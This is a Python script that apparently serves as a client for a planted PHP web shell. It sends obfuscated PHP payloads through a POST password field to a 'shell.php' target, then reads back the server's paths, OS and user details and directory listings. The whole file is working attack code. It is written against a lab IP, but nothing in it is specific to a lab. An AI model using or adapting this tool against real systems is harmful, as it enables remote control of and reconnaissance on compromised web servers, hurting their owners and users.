#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: r1ngs
# contact: r1ngs@outlook.com
# datetime: 2021/1/8 18:16
# software: PyCharm

import requests
import urllib.parse
import socket
from random import randint
from base64 import b64decode, b64encode

def genRandomStr(num):
    r = []
    for _ in range(num):
        r.append(hex(randint(16 ** 7, 16 ** 8))[2:])
    return r

def dns_resolver(url):
    parse = urllib.parse.urlparse(url)
    url_new = parse.netloc
    if url_new == '':
        raise Exception('URL Format Error!')
    result = socket.getaddrinfo(url_new, None)
    IP = result[0][4][0]

    return IP

def TestConn(url, password):
    ra, rb = genRandomStr(2)
    testPayload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function ' \
                  'asoutput(){$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+rb+'";}' \
                  'ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);' \
                  '$R="{$D}\n";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else' \
                  '{$R.="/";}$R.="\n";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)' \
                  '?$u["name"]:@get_current_user();$R.=php_uname();$R.="\n{$s}";echo $R;;}catch(Exception $e){echo ' \
                  '"ERROR://".$e->getMessage();};asoutput();die();'
    data = {password:testPayload}
    r= requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def scanDir(url, password, dir):
    ra, rb, rc = genRandomStr(3)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function ' \
                  'asoutput(){$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}' \
                  'ob_start();try{$D=base64_decode($_POST["' + rc + '"]);$F=@opendir($D);if($F==NULL)' \
                  '{echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F))' \
                  '{$P=$D.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);' \
                  '$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;' \
                  '@closedir($F);};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    data = {password : payload, rc : b64encode(dir.encode())}
    r = requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

if __name__ == '__main__':
    url = 'http://192.168.20.131/shell.php'
    password = 'hacker'
    print(TestConn(url, password))
    print(scanDir(url, password, '/var/www/html/'))
